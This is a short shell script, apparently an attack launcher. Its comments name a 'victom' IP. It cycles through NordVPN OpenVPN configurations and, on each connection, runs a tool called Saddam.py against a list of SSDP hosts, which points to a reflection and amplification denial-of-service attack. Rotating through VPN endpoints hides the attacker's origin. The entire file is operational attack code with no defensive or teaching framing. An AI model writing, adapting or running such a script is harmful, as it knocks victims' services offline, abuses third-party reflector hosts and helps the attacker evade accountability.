#$1 should be like uk100.nordvpn.com.udp.ovpn
#need to set export $victom as victom ip
#find /etc/openvpn/ovpn_udp/ -type f -exec ./repeatovpn.sh {} \;
current=`pwd`
cd /etc/openvpn/ovpn_udp/
echo "config file"
echo $1
openvpn $1&
sleep 10
cd $current
python Saddam.py `cat ssdp_selmon2.txt` -p ssdp_out.txt -t 1
pkill openvpn
